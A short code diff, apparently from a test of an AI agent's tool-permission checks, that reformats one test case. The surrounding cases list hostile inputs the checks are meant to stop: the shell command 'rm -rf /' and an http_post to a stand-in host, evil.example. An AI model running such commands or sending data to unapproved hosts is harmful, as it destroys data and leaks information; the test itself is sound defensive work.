@@ -54,7 +54,11 @@ def main():
         cases = (
             ("clean read", "Read", {"file_path": str(workspace / "notes.txt")}),
             ("destructive shell", "Bash", {"command": "rm -rf /"}),
-            ("out-of-workspace write", "Write", {"file_path": str(workspace.parent / "outside.txt")}),
+            (
+                "out-of-workspace write",
+                "Write",
+                {"file_path": str(workspace.parent / "outside.txt")},
+            ),
             ("unapproved destination", "http_post", {"url": "https://evil.example/events"}),
         )
         for label, tool, arguments in cases:
